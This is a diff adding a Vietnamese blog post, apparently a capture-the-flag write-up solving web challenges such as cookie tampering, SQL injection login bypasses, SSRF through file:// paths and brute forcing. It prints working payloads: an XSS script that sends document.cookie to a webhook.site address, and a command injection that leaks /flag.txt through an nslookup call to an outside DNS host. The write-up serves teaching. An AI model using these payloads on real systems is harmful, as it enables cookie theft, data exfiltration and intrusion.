@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title> // D@rkmod3</title>
+    <title>Cookie Hân Hoan season 1 // D@rkmod3</title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.89.0" />
@@ -12,15 +12,17 @@
 
     
     <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content=""/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:title" content="Cookie Hân Hoan season 1"/>
+<meta name="twitter:description" content="Web-basic 1.Hân Hoan Vào trang web, ta thấy có 1 form đăng nhập. Đăng nhập bằng 1 tài khoản bất kì, kết quả trả về là “You are not CookieHanHoan!” Chỉnh sửa cookie ở phần httprequest header ta có được flag 2.Header 401 Từ tên challenge, mình đoán rằng bài này thuộc dạng authentication, status 401 chính là Unauthorized lúc người dùng xác thực sai thông tin.
+Xem source HTML, mình thấy 1 chuỗi thông tin được comment lại"/>
 
-    <meta property="og:title" content="" />
-<meta property="og:description" content="" />
+    <meta property="og:title" content="Cookie Hân Hoan season 1" />
+<meta property="og:description" content="Web-basic 1.Hân Hoan Vào trang web, ta thấy có 1 form đăng nhập. Đăng nhập bằng 1 tài khoản bất kì, kết quả trả về là “You are not CookieHanHoan!” Chỉnh sửa cookie ở phần httprequest header ta có được flag 2.Header 401 Từ tên challenge, mình đoán rằng bài này thuộc dạng authentication, status 401 chính là Unauthorized lúc người dùng xác thực sai thông tin.
+Xem source HTML, mình thấy 1 chuỗi thông tin được comment lại" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/cookiehanhoanseason-1/" /><meta property="article:section" content="posts" />
-
-
+<meta property="article:published_time" content="2021-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-11-04T00:00:00+00:00" />
 
 
 
@@ -35,26 +37,272 @@
       
   <article class="post">
     <header class="post-header">
-      <h1 class ="post-title"></h1>
+      <h1 class ="post-title">Cookie Hân Hoan season 1</h1>
       <div class="post-meta">
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
   <title>calendar</title>
   <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
 </svg>
-          Jan 1, 0001
+          Nov 4, 2021
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          0 min read
+          8 min read
         </div>
       </div>
     </header>
     <div class="post-content">
-      
+      <h1 id="web-basic">Web-basic</h1>
+<h2 id="1hân-hoan">1.Hân Hoan</h2>
+<p>Vào trang web, ta thấy có 1 form đăng nhập. Đăng nhập bằng 1 tài khoản bất kì, kết quả trả về là “You are not CookieHanHoan!”
+<img src="img/wb1-1.png" alt="1">
+Chỉnh sửa cookie ở phần httprequest header ta có được flag
+<img src="img/wb1-2.png" alt="2"></p>
+<h2 id="2header-401">2.Header 401</h2>
+<p>Từ tên challenge, mình đoán rằng bài này thuộc dạng authentication, status 401 chính là Unauthorized lúc người dùng xác thực sai thông tin.</p>
+<p>Xem source HTML, mình thấy 1 chuỗi thông tin được comment lại</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!--
+</span><span style="color:#75715e">	Basic Authentication Credential: gaconlonton/cookiehanhoan
+</span><span style="color:#75715e">→
+</span></code></pre></div><p>Ta sẽ dùng thông tin này để xác thực với syntax như sau</p>
+<p>Authorization: Basic base64(user:pass)</p>
+<p>base64(<code>gaconlonton:cookiehanhoan</code>) ==&gt; <code>Z2Fjb25sb250b246Y29va2llaGFuaG9hbg==</code></p>
+<p>Gởi request lên bằng method POST</p>
+<p><img src="img/wb2-1.png" alt="2-1"></p>
+<h2 id="3-js-bp-bp">3. JS B**p B**p</h2>
+<p>View-source HTML, có 4 file script được include vào
+<img src="img/wb3-1.png" alt="3-1"></p>
+<p>Vào xem mã nguồn của 4 file này, ta thấy rằng chỉ toàn là những kí tự +,[,],!, Search gg mình biết được đây là 1 dạng jsfuck.</p>
+<p>Mình tìm cách decode jsfuck trên google và thấy 1 trang khá là hay :
+<a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">Decoder-JSFUCK</a></p>
+<p>Okay, bây giờ ta sẽ sử dụng tool trên để decode hết 4 file script này:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// 1.js
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verifyUsername</span>(<span style="color:#a6e22e">username</span>) {     <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;cookiehanhoan&#34;</span>) {       <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>     }     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>   }
+
+<span style="color:#75715e">// 2.js
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reverseString</span>(<span style="color:#a6e22e">str</span>) {   <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">str</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>)    { <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span> }   <span style="color:#66d9ef">else</span> {   <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">reverseString</span>(<span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">charAt</span>(<span style="color:#ae81ff">0</span>)}   }
+
+<span style="color:#75715e">// 3.js
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verifyPassword</span>(<span style="color:#a6e22e">password</span>) {     <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reverseString</span>(<span style="color:#a6e22e">password</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;dr0Wss@p3rucreSr3pus&#34;</span>) {       <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>     }     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>   }
+
+<span style="color:#75715e">// 4.js
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verifyRole</span>(<span style="color:#a6e22e">role</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">64</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+    <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">209</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">9</span>)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+    }
+    <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">3</span>).<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">4</span>).<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;10578&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">27</span>)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
+}
+</code></pre></div><p>Từ:</p>
+<ul>
+<li>1.js, ta biết được username ta cần nhập là  cookiehanhoan</li>
+<li>2.js, Hàm đảo ngược kí tự trong chuỗi</li>
+<li>3.js, Đảo ngược kí tự của password ra chuỗi  dr0Wss@p3rucreSr3pus
+<ul>
+<li>Chuỗi cần nhập sẽ là  reverseString(“dr0Wss@p3rucreSr3pus”)</li>
+<li>password = sup3rSercur3p@ssW0rd</li>
+</ul>
+</li>
+<li>4.js, Hàm verifyRole có tác dụng kiểm tra các kí tự của role, theo quy tắc:
+<ul>
+<li>Ở đây, mình sẽ biểu diễn chuỗi string theo kiểu array cho dễ hiểu</li>
+<li>Mã Ascii của kí tự đầu tiên = 64 → role[0] = ‘@’</li>
+<li>Ascii(role[1]) + Ascii(role[2]) = 209</li>
+<li>Ascii(role[2]) – Ascii(role[1]) = 9</li>
+<li>Ở đây, ta giả sử kí tự 1 là x1, kí tự 2 là x2:</li>
+<li>ta có x1 + x2 = 209 và x2 – x1 = 9</li>
+<li>Giải phương trình ta có được x1= 100 và x2 = 109</li>
+<li>role[1] = ‘d’, role[2] = ‘m’</li>
+<li>Chuỗi (Ascii(role[3]) + Ascii(role[4])) = “10578”, Ascii(role[3]) – Ascii(role[4]) = 27</li>
+<li>Từ điều trên ta có được role[3] = ‘i’, role[4] = ‘N’</li>
+</ul>
+</li>
+</ul>
+<p>Như vậy, dữ liệu mà ta cần nhập vào là:</p>
+<pre tabindex="0"><code>username = cookiehanhoan
+password = sup3rSercur3p@ssW0rd
+role = @dmin
+</code></pre><p><code>==&gt; Flag{JAV-ascript_F*ck}</code></p>
+<h2 id="4-impossible">4. Impossible</h2>
+<p>Xem sourse HTML, ta thấy hàm checkPass được gọi khi ta nhấn vào button Submit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkPass</span>()
+{
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;password&#39;</span>).<span style="color:#a6e22e">value</span>;
+	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">password</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;cookiehanhoan&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Y29va2llaGFuaG9hbg==&#34;</span>) {
+		window.<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() {
+			window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">assign</span>(<span style="color:#e6db74">&#39;check.php?password=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">password</span>);
+		}, <span style="color:#ae81ff">500</span>);
+	}
+}
+</code></pre></div><p>Decode chuỗi base64 trên ta được password cookiehanhoan</p>
+<p>Đoạn code ở trên không thay thế bằng đệ quy nên ta có thể double đoạn string như sau:</p>
+<p>cookiecookiehanhoanhanhoan</p>
+<p>Giải thích:
+chữ <code>cookiehanhoan</code> sẽ được tìm thấy trong chuỗi và bị thay thế thành rỗng vì thế ta sẽ nhận được chuỗi còn lại <code>cookiehanhoan</code>.</p>
+<p><code>cookie</code><del>cookiehanhoan</del><code>hanhoan</code> ==&gt; cookiehanhoan</p>
+<p><code>==&gt; Flag{Javascript_is_not_safe???}</code></p>
+<h2 id="5infinite-loop">5.Infinite Loop</h2>
+<p>Bài này liên lục redirect đến id khác nhau, ta dùng burpsuite để xem history response của request, ở request
+<code>?id=6</code> có chứa flag.
+<img src="img/wb5-1.png" alt="5-1"></p>
+<h2 id="6i-am-not-a-robot">6.I am not a robot</h2>
+<p>Vào trang
+<a href="http://chal2.web.letspentest.org/robots.txt">http://chal2.web.letspentest.org/robots.txt</a></p>
+<pre tabindex="0"><code>User-agent: *
+Allow: /fl@g1337_d240c789f29416e11a3084a7b50fade5.txt
+</code></pre><p>Vào đường dẫn trên ta có flag</p>
+<p><code>==&gt; Flag{N0_B0T_@ll0w}</code></p>
+<h2 id="7gatling-gun">7.Gatling gun</h2>
+<p>Xem source HTML
+<code>==&gt; Flag{Web_Sause_Delicious}</code></p>
+<hr>
+<h1 id="web-explotation">Web Explotation</h1>
+<h1 id="1-xss">1. XSS</h1>
+<p>Thử với <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  popup hiện ra cho thấy rằng đoạn javascript được thực thi khi.</p>
+<p>Mình dùng payload xss sau để lấy được cookie của admin bot thông qua webhook.
+Webhook có thể hiểu là dịch vụ thứ 3 nơi nhận các gói tin từ http, có rất nhiều dịch vụ webhook online miễn phí, các bạn có thể tìm trên google. Ở đây mình dùng <a href="https://webhook.site/">https://webhook.site/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+	<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://webhook.site/1b653ea8-7512-4d47-b459-071f20ef5152?c=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>)
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>Xem request nhận được từ webhook, ta có được flag
+<img src="img/we-1.png" alt="we1">
+<code>==&gt; FLAG{5b7eca261028a4042fde4e3f45dec294}</code>
+Do quá nhiều request khiến admin bot bị quá tải nên đợi khá lâu để có được flag.</p>
+<h1 id="2-xss-filter">2. XSS Filter</h1>
+<p>Giống ý tưởng bài trên nhưng để ý rằng server thêm CSP (Content Security Policy)
+<code>default-src 'self'; script-src 'nonce-matuhn' 'strict-dynamic'; style-src 'unsafe-inline'</code>
+Ta có thể hiểu là nonce-xxxxxxxx có nghĩa là chỉ cho phép tag script nào match chính xác thì mới được phép thực thi</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;matuhn&#34;</span><span style="color:#f92672">&gt;</span>
+	<span style="color:#a6e22e">fetch</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//webhook.site/1b653ea8-7512-4d47-b459-071f20ef5152?c=’ + document.cookie)
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>Đợi 1 lúc. Xem request nhận được từ webhook, ta sẽ có được flag.</p>
+<h1 id="3-ét-quy-eo">3. Ét Quy Eo</h1>
+<p>Bài này thuộc loại sql injection authentication. Ta có thể dùng payload sau:
+<code>xxx' or 1=1 --</code></p>
+<p>Đoạn query sẽ thực hiện trông như thế này:</p>
+<p><code>select * from users where username='xxx' or 1=1-- and password=''</code></p>
+<p>Vì 1=1 trả về true và đoạn sau dấu &ndash; sẽ bị comment</p>
+<p>nên ta có thể hiểu câu lệnh query như sau:</p>
+<p><code>select * from users where username=true</code></p>
+<p>Kết quả trả về:</p>
+<p><code>(1, 'lil uzi vert', 'is_admin', 'RmxhZ3tGcjMzX1N0eWwzfQ==')</code></p>
+<p>decode đoạn base64 ta được flag</p>
+<p><code>==&gt; flag = Flag{Fr33_Styl3}</code></p>
+<h1 id="4-sql-filter">4. SQL Filter</h1>
+<p>Bài này đã filter chữ <code>or</code> và <code>dấu cách</code>, nhưng mình vẫn có thể bypass được bằng cách dùng <code>oR</code> :)) (vì câu lệnh sql chữ thường hay in hoa đều được thực thi )</p>
+<p>Thay vì <code>1=1</code> ta có thể dùng <code>(1)</code></p>
+<p>payload : <code>xxx'oR(1)--</code></p>
+<p>(1, &lsquo;lil uzi vert&rsquo;, &lsquo;is_admin&rsquo;, &lsquo;RmxhZ3tHcjMzdDFuR30=')</p>
+<p><code>==&gt; flag = Flag{Gr33t1nG}</code></p>
+<h1 id="5-misconfiguration">5. Misconfiguration</h1>
+<p>Bài này flag được chia làm 3 phần.</p>
+<p>Dùng tool gobuster với wordlist common.txt ta có 2 đường dẫn là:</p>
+<p>.htaccess → part 1: Flag{1b283f0725</p>
+<p>web.config → part 2: d536a0f217d89</p>
+<p>Trong web-config, ở tag <code>&lt;deny&gt;</code> ta thấy 1 đường dẫn đến file <code>backup-ddmmyy.bak</code></p>
+<p>Sau khi download file này về, mình dùng command file trong linux để xác định loại file</p>
+<pre tabindex="0"><code>$ file backup-ddmmyy.bak
+backup-ddmmyy.bak: Zip archive data, at least v2.0 to extract
+
+$ unzip a.zip -d .
+Archive:  a.zip
+  inflating: ./part3.txt
+
+$ cat part3.txt 
+part 3 of the flag : caca7b183}
+</code></pre><p><code>==&gt; flag = Flag{1b283f0725d536a0f217d89caca7b183}</code></p>
+<h1 id="6-paparazzi">6. Paparazzi</h1>
+<p>Đây là 1 service có chức năng truy cập vào url ta nhập vào và chụp lại màn hình.
+Dạng này thuộc loại SSRF, ta có thể fuzz nhanh với wrapper <code>file:///</code></p>
+<p><img src="img/we6-1.png" alt="we6-1"></p>
+<p><code>file:///proc/</code></p>
+<p><img src="img/we6-2.png" alt="we6-2"></p>
+<p>Search google một hồi mình biết được rằng ta có thể lấy thông tin từ thư mục hiện hành thông qua <code>/proc/{id}/cwd</code></p>
+<p><code>file:///proc/1/cwd</code></p>
+<p><img src="img/we6-3.png" alt="we6-3"></p>
+<p>Oh có 1 thư mục có tên lạ, mình vào thư mục này thì có 1 file flag.txt</p>
+<p><img src="img/we6-4.png" alt="we6-4"></p>
+<p><code>file:///proc/1/cwd/Th1s_1s_sEcreT_pAth_c4n_Gu3sss_17831278392131/flag.txt</code></p>
+<p><img src="img/we6-5.png" alt="we6-5"></p>
+<h1 id="7gatling-gun-1">7.Gatling gun</h1>
+<p>Đầu tiên mình kiếm đến đường github theo yêu cầu của phần mô tả của challenge:
+<a href="https://github.com/cookiehanhoan/HoangTuEch">https://github.com/cookiehanhoan/HoangTuEch</a></p>
+<p>Từ đây ta có được 3 wordlist : id, password, username</p>
+<p>Ở đây, mình dùng extension burp intruder để bruteforce, mình thiết lập loại tấn công là Cluster bomb và set 3 payload tương ứng với 3 tham số truyền vào.</p>
+<p><img src="img/we7-1.png" alt="we7-1">
+<img src="img/we7-2.png" alt="we7-2"></p>
+<p>Ta cài đặt filter với option Negative search, để filter những request không có kí tự FLAG{Not_True}.</p>
+<p><img src="img/we7-3.png" alt="we7-3">
+<img src="img/we7-4.png" alt="we7-4"></p>
+<h1 id="8-the-maze-runner">8. The maze runner</h1>
+<p>Bài này cho ta rất nhiều directory, mình dùng tool ZAP để fuzz hết những directory này, ta có được 4 fake flag và 1 flag thật</p>
+<p><img src="img/we8-1.png" alt="we8-1"></p>
+<h1 id="9-idor11">9. ID&rsquo;OR1=1</h1>
+<p>Tên đề bài khiến mình ăn ngay cú lừa liên tưởng đến sql injection, khiến mình tốn rất nhiều thời gian =.=</p>
+<p>Bài này chỉ đơn giản là bruteforce id, mình tiếp tục sử dụng burp intruder, nhận thấy rằng id=1337 có chứa flag</p>
+<p><code>{&quot;Age&quot;:18,&quot;Email&quot;:&quot;Flag{61cb4a784e83b6109999af6f036b88bf}&quot;,&quot;First_Name&quot;:&quot;Admin&quot;,&quot;Gender&quot;:&quot;Female&quot;,&quot;Id&quot;:1337,&quot;Last_Name&quot;:&quot;Pro&quot;}</code></p>
+<h1 id="10-a-tiny-hole">10. A tiny hole</h1>
+<p>Xem qua source-code được cung cấp, mình nhận thấy những đặc điểm sau:</p>
+<ul>
+<li>Theo description từ challenge, server hạn chế kết nối ra bên ngoài -&gt; loại bỏ ý tưởng reverse shell</li>
+<li>Server download nội dung từ 1 file và chạy file đó bằng bash command</li>
+<li>Server không filter ở đường dẫn thư mục -&gt; lợi dụng được lỗ hổng LFI</li>
+<li>Server không có chỗ cho ta đọc output -&gt; Data extrafiltation</li>
+<li>URL không filter -&gt; lợi dụng được lỗ hổng SSRF</li>
+<li>Vì lỗi được parse ra ở file log -&gt; lợi dụng điều này để trigger payload</li>
+</ul>
+<p>Xem qua đoạn code, mục tiêu hướng đến của chúng ta ở bài này là control script_path để chạy đoạn lệnh ta mong muốn.</p>
+<p><img src="img/we10-1.png" alt="we10-1"></p>
+<p>Có 1 vấn đề là Server hạn chế kết nối ra bên ngoài nên ta bắt buộc url_script phải là đường dẫn internal.</p>
+<p>Để ý lại URL không hề filter, nên mình dùng SSRF qua protocol file:// để lấy nội dung từ file /etc/hosts.</p>
+<p>Trong quá trình phân tích và đọc hiểu code, mình nghĩ ra một ý tưởng là sử dụng dấu xuống dòng
+(\r\n) ở script_name để gây ra lỗi và nội dung sẽ ghi vào file log, ta cùng xem đoạn query sau:</p>
+<p><img src="img/we10-2.png" alt="we10-2"></p>
+<p>Và đây là kết quả khi chạy payload trên:</p>
+<p><img src="img/we10-3.png" alt="we10-3"></p>
+<p>Magic chưa :v, vì tên file không đúng định dạng dẫn đến lỗi nên khi thực thi dòng này</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">command <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#39;bash&#39;</span>, script_path], stderr<span style="color:#f92672">=</span>lf, stdout<span style="color:#f92672">=</span>lf, universal_newlines<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</code></pre></div><p>kết quả trả về từ process sẽ dẫn đến lỗi và ghi vào file log qua option stderr</p>
+<p>Ok từ đây ta chỉ cần trigger đoạn trên bằng đoạn query thứ 2:</p>
+<p><img src="img/we10-4.png" alt="we10-4"></p>
+<p>Và kết quả thu được:</p>
+<p>File log2.txt:</p>
+<p>dòng echo 123 đã được thực thi</p>
+<p>Kết luận:</p>
+<p><img src="img/web10-5.png" alt="we10-5"></p>
+<ul>
+<li>Sau nhiều lần thử các loại protocol cuối cùng mình nhận thấy chỉ DNS phản hồi từ server thông qua câu lệnh nslookup.</li>
+<li>Theo kinh nghiệm của mình thì flag thường nằm ở root nên mình đoán luôn là /flag.txt</li>
+<li>Mặc dù DNS đã parse trong file log, nhưng Payload của mình không work nên mình dùng thêm dấu backtick để chắc rằng câu lệnh sẽ được thực hiện.</li>
+<li>Lưu ý rằng, mọi thứ trong dấu backtick sẽ luôn được thực hiện trước câu lệnh chính</li>
+</ul>
+<p>Final payload:</p>
+<p>request1:</p>
+<pre tabindex="0"><code>command_log_file=log
+&amp;script_dir=toidihackdao
+&amp;script_name=%0A`nslookup $(cat $(echo Y2F0IC9mbGFnLnR4dA== | base64 -d)).qcpar0iw.requestrepo.com`%0A
+&amp;script_url=file:///etc/hosts
+</code></pre><p>request2:</p>
+<pre tabindex="0"><code>command_log_file=log2
+&amp;script_dir=toidihackdao
+&amp;script_name=hackisfun
+&amp;script_url=file:///src/logs/log.txt
+</code></pre><p>Kết quả:</p>
+<p><img src="img/web10-6.png" alt="we10-6">
+<code>==&gt; Flag{CookieWarrior_Please_Think_Out_Of_The_Box}</code></p>
+
     </div>
     <div class="post-footer">
       
